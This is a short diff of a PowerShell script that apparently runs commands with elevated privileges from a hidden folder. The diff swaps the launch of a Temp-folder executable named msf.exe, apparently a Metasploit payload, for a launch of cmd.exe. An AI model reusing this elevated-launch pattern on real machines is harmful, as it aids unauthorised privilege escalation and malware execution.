@@ -47,7 +47,7 @@ try {
 # Define the commands to execute with elevated privileges
 $CommandsToExecute = @"
 # Define your commands here
- start-process "C:\Users\vedan\AppData\Local\Temp\w\msf.exe"
+ start-process cmd.exe
 "@
 
 # Write the commands to a script file in the hidden folder
